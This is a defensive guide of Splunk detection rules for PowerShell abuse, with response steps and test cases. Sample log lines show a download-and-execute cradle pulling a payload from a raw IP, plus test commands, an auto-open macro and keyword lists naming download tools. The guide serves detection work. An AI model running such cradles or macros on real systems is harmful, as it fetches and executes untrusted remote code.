# PowerShell Abuse Detection Rules

## Overview

PowerShell is a powerful administration tool that adversaries frequently abuse for malicious purposes. These rules detect encoded commands, download cradles, and suspicious parent-child process relationships that indicate PowerShell-based attacks.

**Why PowerShell is Targeted by Attackers:**
- Pre-installed on all Windows systems
- Direct access to .NET framework and Windows APIs
- Can execute in-memory (fileless attacks)
- Often whitelisted by security tools
- Capable of network communication, file operations, credential access

---

## Rule 1: Encoded PowerShell Commands

### Description
Detects PowerShell execution with encoded commands, a common obfuscation technique used by attackers to hide malicious code from casual inspection.

### MITRE ATT&CK Mapping
- **Tactic:** Execution
- **Technique:** T1059.001 (Command and Scripting Interpreter: PowerShell)
- **Sub-Technique:** Obfuscated commands

### Splunk SPL Query

```spl
index=windows_sysmon EventCode=1 Image="*powershell.exe"
| eval cmdline_lower=lower(CommandLine)
| where match(cmdline_lower, "-enc") OR 
        match(cmdline_lower, "-encodedcommand") OR 
        match(cmdline_lower, "frombase64string")
| table _time, ComputerName, User, CommandLine, ParentImage, ParentCommandLine
| eval severity="High"
| sort -_time
```

### Query Explanation

1. `EventCode=1` - Sysmon Process Creation events capture full command line
2. `Image="*powershell.exe"` - Filters for PowerShell and PowerShell ISE
3. `eval cmdline_lower=lower(CommandLine)` - Normalizes to lowercase for matching
4. `match()` functions - Search for encoding-related parameters:
   - `-enc` or `-encodedcommand`: Command-line switch for encoded commands
   - `frombase64string`: Method used to decode Base64 in scripts
5. `ParentImage` and `ParentCommandLine` - Shows what launched PowerShell (critical for context)

### True Positive Indicators

**Malicious encoded PowerShell typically shows:**
- **Parent Process:** Suspicious executables (WScript.exe, Excel.exe, mshta.exe, suspicious .exe from temp folders)
- **Additional flags:** `-NoProfile`, `-WindowStyle Hidden`, `-ExecutionPolicy Bypass`, `-NonInteractive`
- **Long encoded strings:** Hundreds to thousands of Base64 characters
- **Network indicators:** After decoding, contains download URLs or IP addresses
- **Execution path:** Runs from user temp folders, Downloads, AppData

**Example True Positive:**
```
User: a.chen
CommandLine: powershell.exe -NoP -W Hidden -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATw...
ParentImage: C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
```

This shows Excel spawning hidden PowerShell with encoded command - classic macro-based malware.

### False Positive Scenarios

**Legitimate encoded PowerShell:**
- **System Management Tools:** SCCM, Intune, Configuration Manager deployment scripts
- **Monitoring Agents:** Some EDR and monitoring tools use encoded PS for installation
- **Admin Scripts:** IT administrators sometimes use encoding for complex scheduled tasks

**Mitigation Strategies:**
1. Whitelist known good parent processes running from legitimate paths:
   ```spl
   | where ParentImage!="C:\\Program Files\\Microsoft Monitoring Agent\\*"
   ```

2. Whitelist specific admin workstations:
   ```spl
   | where ComputerName!="IT-ADMIN-WS-01" AND ComputerName!="IT-ADMIN-WS-02"
   ```

3. Investigate and baseline all encoded PowerShell in environment
4. Decode the Base64 to determine if content is benign

### Decoding Base64 Commands

To analyze the encoded command:

```powershell
# Copy the Base64 string after -Enc parameter
$encodedCmd = "JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATw..."

# Decode it
$decodedBytes = [System.Convert]::FromBase64String($encodedCmd)
$decodedCmd = [System.Text.Encoding]::Unicode.GetString($decodedBytes)
Write-Host $decodedCmd
```

**Common malicious decoded content:**
- Invoke-WebRequest to download payloads
- IEX (Invoke-Expression) to execute downloaded scripts
- Net.WebClient for downloads
- Connection to suspicious IPs or domains
- Credential harvesting (Get-Credential, mimikatz)

### Response Actions

1. **Immediate Isolation:**
   - If confirmed malicious, isolate endpoint from network
   - Kill PowerShell process if still running

2. **Decode and Analyze:**
   - Extract and decode the Base64 command
   - Identify IOCs (URLs, IPs, file paths, registry keys)
   - Determine attack objective

3. **Forensic Investigation:**
   - How did malicious PS execute? (phishing email, drive-by download, local execution)
   - Check parent process for compromise indicators
   - Review Sysmon Event 3 (network) for C2 connections from PowerShell PID
   - Check Sysmon Event 11 (file creation) for dropped files

4. **Containment:**
   - Block identified IOCs (URLs, IPs) at proxy/firewall
   - Remove malicious files if present
   - Reset user credentials if compromised

5. **Prevention:**
   - Enable PowerShell Constrained Language Mode
   - Implement Application Whitelisting
   - Deploy attack surface reduction rules

### Testing with Atomic Red Team

```powershell
# Test T1059.001 - Encoded command execution
Invoke-AtomicTest T1059.001 -TestNumbers 1
```

This executes a benign encoded PowerShell command:
```powershell
powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAGwAbABvACIA
# Decodes to: Write-Host "Hello"
```

Should trigger alert in Splunk.

---

## Rule 2: PowerShell Download Cradle

### Description
Detects PowerShell attempting to download content from internet, commonly used for stage-2 payload retrieval or fileless malware execution.

### MITRE ATT&CK Mapping
- **Tactic:** Command and Control
- **Technique:** T1105 (Ingress Tool Transfer)
- **Sub-Technique:** Download and execute payloads

### Splunk SPL Query

```spl
index=windows_sysmon EventCode=1 Image="*powershell.exe"
| eval cmdline_lower=lower(CommandLine)
| where match(cmdline_lower, "invoke-webrequest") OR
        match(cmdline_lower, "iwr") OR
        match(cmdline_lower, "wget") OR
        match(cmdline_lower, "curl") OR
        match(cmdline_lower, "downloadstring") OR
        match(cmdline_lower, "downloadfile") OR
        match(cmdline_lower, "net.webclient") OR
        match(cmdline_lower, "bitstransfer") OR
        match(cmdline_lower, "iex")
| table _time, ComputerName, User, Image, CommandLine, ParentImage, ParentCommandLine
| eval severity="High"
| sort -_time
```

### Query Explanation

1. Searches for PowerShell process creation with download-related cmdlets/methods:
   - `Invoke-WebRequest` / `iwr`: Standard PowerShell web request cmdlet
   - `wget` / `curl`: PowerShell aliases for Invoke-WebRequest
   - `DownloadString` / `DownloadFile`: .NET WebClient methods
   - `Net.WebClient`: Direct instantiation of WebClient class
   - `Start-BitsTransfer`: Background Intelligent Transfer Service
   - `IEX`: Invoke-Expression, often used with download cradles to execute downloaded content

2. Captures parent process to understand execution chain

### True Positive Indicators

**Malicious download cradles show:**
- **Suspicious URLs:** IP addresses instead of domains, non-standard ports, suspicious TLDs
- **Piped to IEX:** `IEX (New-Object Net.WebClient).DownloadString('http://...')` - Downloads and executes without touching disk
- **Parent process:** Office applications, browsers, WScript, suspicious executables
- **User context:** Non-admin users downloading and executing
- **Suspicious domains:** Pastebin, GitHub raw, URL shorteners, newly registered domains

**Example True Positive:**
```
CommandLine: powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('http://91.215.85.17:8080/payload.ps1')"
ParentImage: C:\Windows\System32\WScript.exe
```

Direct IP address, piped to IEX for immediate execution, launched by WScript - high confidence malicious.

### False Positive Scenarios

**Legitimate PowerShell downloads:**
- **Software installation scripts:** IT automation downloading installers
- **Update scripts:** Pulling configuration files or updates from internal servers
- **Admin maintenance:** Sysadmins downloading tools from Microsoft/GitHub
- **Legitimate software:** Some software uses PowerShell for updates (check vendor documentation)

**Mitigation:**
1. Whitelist internal domains:
   ```spl
   | where NOT match(CommandLine, "internalserver\.soclab\.local")
   ```

2. Whitelist known admin accounts/workstations
3. Focus on external/suspicious URLs
4. Alert only on IEX combinations (download + execute)

### IOC Extraction

When alert fires, extract URLs for threat intelligence:

```spl
index=windows_sysmon EventCode=1 CommandLine="*Invoke-WebRequest*"
| rex field=CommandLine "(?i)(http[s]?://[^\s'\"]+)"
| stats count by extracted_url
```

Check extracted URLs against:
- VirusTotal: https://www.virustotal.com/
- URLScan.io: https://urlscan.io/
- AbuseIPDB: https://www.abuseipdb.com/

### Response Actions

1. **Identify Download Source:**
   - Extract URL from command line
   - Check reputation (threat intel feeds)
   - Identify hosting provider

2. **Check if Download Succeeded:**
   - Review Sysmon Event 3 (network connection) from PowerShell PID
   - Check Sysmon Event 11 (file creation) for downloaded files
   - Review Sysmon Event 22 (DNS query) for domain resolution

3. **Analyze Downloaded Content:**
   - If file was downloaded, submit to sandbox (Any.Run, Joe Sandbox)
   - Check for malware signatures
   - Identify C2 infrastructure

4. **Scope Assessment:**
   - Search for same URL across all endpoints
   - Check if other users/hosts affected

5. **Containment:**
   - Block malicious URL at proxy
   - Block C2 infrastructure at firewall
   - Remove downloaded files
   - Isolate affected endpoints

### Testing

Manual test:
```powershell
# Benign download test (downloads text file)
powershell.exe -c "Invoke-WebRequest -Uri 'http://example.com/test.txt' -OutFile 'C:\temp\test.txt'"

# Download cradle test (benign)
powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"
```

Both should trigger alert.

---

## Rule 3: Suspicious Parent-Child Process Relationship

### Description
Detects Microsoft Office applications (Word, Excel, Outlook) or other document readers spawning PowerShell, cmd, or scripting engines - a strong indicator of macro-based malware or exploitation.

### MITRE ATT&CK Mapping
- **Tactic:** Execution
- **Technique:** T1204.002 (User Execution: Malicious File)
- **Sub-Technique:** Office macros spawning shells

### Splunk SPL Query

```spl
index=windows_sysmon EventCode=1
| eval parent_proc=lower(ParentImage)
| eval child_proc=lower(Image)
| where (match(parent_proc, "winword\.exe") OR 
         match(parent_proc, "excel\.exe") OR 
         match(parent_proc, "outlook\.exe") OR 
         match(parent_proc, "powerpnt\.exe") OR
         match(parent_proc, "acrord32\.exe") OR
         match(parent_proc, "foxitreader\.exe"))
       AND
       (match(child_proc, "powershell\.exe") OR 
        match(child_proc, "cmd\.exe") OR 
        match(child_proc, "wscript\.exe") OR 
        match(child_proc, "cscript\.exe") OR 
        match(child_proc, "mshta\.exe") OR
        match(child_proc, "rundll32\.exe"))
| table _time, ComputerName, User, ParentImage, Image, CommandLine
| eval severity="Critical"
| sort -_time
```

### Query Explanation

1. `EventCode=1` - Process creation events
2. Converts parent and child image paths to lowercase for consistent matching
3. **Parent process check:** Office apps (Word, Excel, Outlook, PowerPoint) or PDF readers
4. **Child process check:** Command shells and script interpreters
5. This combination is almost never legitimate - Office should not spawn shells

### True Positive Indicators

**This is a HIGH CONFIDENCE detection** - Office spawning shells is nearly always malicious:

**Attack Chain:**
1. User receives phishing email with malicious attachment
2. Opens document (Word/Excel) with macro-enabled content
3. Macro executes, spawning PowerShell or cmd
4. Shell downloads stage-2 payload
5. Malware executes, establishes persistence

**Key Characteristics:**
- Document typically from external source (email attachment, web download)
- Child process often has suspicious flags (`-Enc`, `-WindowStyle Hidden`)
- Network activity shortly after (Sysmon Event 3) for payload download
- File creation in temp folders (Sysmon Event 11)

**Example:**
```
_time: 2026-01-15 14:23:41
ComputerName: WS-FIN-PC01
User: a.chen
ParentImage: C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: "powershell.exe" -NoP -W Hidden -Enc JAB...
```

### False Positive Scenarios

**Rare legitimate scenarios:**
- **Excel Add-ins:** Some enterprise add-ins spawn PowerShell for automation (should be centrally managed/whitelisted)
- **Outlook rules:** Custom Outlook rules executing scripts (organizational policy should prevent this)
- **Embedded objects:** Legitimate embedded scripts in documents (rare, should use different mechanisms)

**Realistically:** This rule generates very few false positives. Investigate every alert.

### Response Actions

**CRITICAL ALERT - IMMEDIATE RESPONSE:**

1. **Isolate Endpoint Immediately:**
   ```powershell
   # From SIEM or EDR console
   # Isolate-Host -ComputerName WS-FIN-PC01
   ```

2. **Identify Source Document:**
   - Interview user: Which document did they open?
   - Check recent file access (Event 4663, Sysmon Event 11)
   - Locate document (usually in Downloads, Desktop, email attachments)

3. **Preserve Evidence:**
   - Copy malicious document to secure location for analysis
   - Export relevant Sysmon/Security logs
   - Take memory dump if malware is running

4. **Analyze Malicious Document:**
   - Submit to sandbox (Any.Run, Joe Sandbox, Hybrid Analysis)
   - Extract macros: Use `olevba` tool
   - Identify IOCs from macro code

5. **Check for Payload Download:**
   ```spl
   index=windows_sysmon EventCode=3 Image="*powershell.exe" ComputerName="WS-FIN-PC01"
   | table _time, DestinationIp, DestinationPort, DestinationHostname
   ```

6. **Scope Assessment:**
   - Check email logs: Did other users receive same document?
   - Search other endpoints for same process relationship
   - Check for same file hash across environment

7. **Eradication:**
   - Remove malicious document
   - Remove dropped payloads
   - Remove persistence mechanisms
   - Consider full re-image

8. **Recovery:**
   - Reset user credentials (document may have stolen credentials)
   - Re-enable network access after verification
   - Restore from backup if needed

### Enhanced Detection

Correlate with file creation:

```spl
index=windows_sysmon (EventCode=1 OR EventCode=11)
| eval proc_parent=if(EventCode=1, ParentImage, null())
| eval file_image=if(EventCode=11, Image, null())
| where match(proc_parent, "EXCEL\.EXE") OR match(file_image, "EXCEL\.EXE")
| table _time, EventCode, ComputerName, User, proc_parent, Image, CommandLine, TargetFilename
```

Shows Office app spawning process AND files being created - complete attack picture.

### Prevention

1. **Block Macros:** Disable macros from internet-sourced documents via Group Policy
2. **Attack Surface Reduction:** Enable Windows Defender ASR rule "Block Office applications from creating child processes"
3. **Application Control:** Use AppLocker to prevent Office from spawning shells
4. **User Training:** Teach users not to enable macros on documents from unknown sources
5. **Email Filtering:** Block macro-enabled documents at email gateway

### Testing

Create test macro in Excel (Macro-enabled workbook .xlsm):

```vba
Sub Auto_Open()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell.exe -c Write-Host 'Test'"
End Sub
```

Save, close, re-open and enable macros. Should trigger alert immediately.

---

## Summary

These three PowerShell detection rules provide defense-in-depth:

1. **Rule 1:** Obfuscation detection (encoded commands)
2. **Rule 2:** Network activity detection (download cradles)
3. **Rule 3:** Execution chain detection (suspicious parent-child)

**Combined Coverage:** These rules detect most PowerShell-based attacks including:
- Macro-based malware
- Phishing payloads
- Post-exploitation frameworks (Empire, Cobalt Strike)
- Living-off-the-land attacks
- Fileless malware

**Recommended Alert Priority:**
- Rule 3: **Critical** - Office spawning shells (investigate every alert)
- Rule 1: **High** - Encoded commands (investigate unless whitelisted)
- Rule 2: **High** - Download cradles (investigate external URLs)

**Key Metrics:**
- PowerShell alerts per day
- Percentage from Office parents (Rule 3)
- Most common encoded command patterns
- Top downloaded domains/IPs
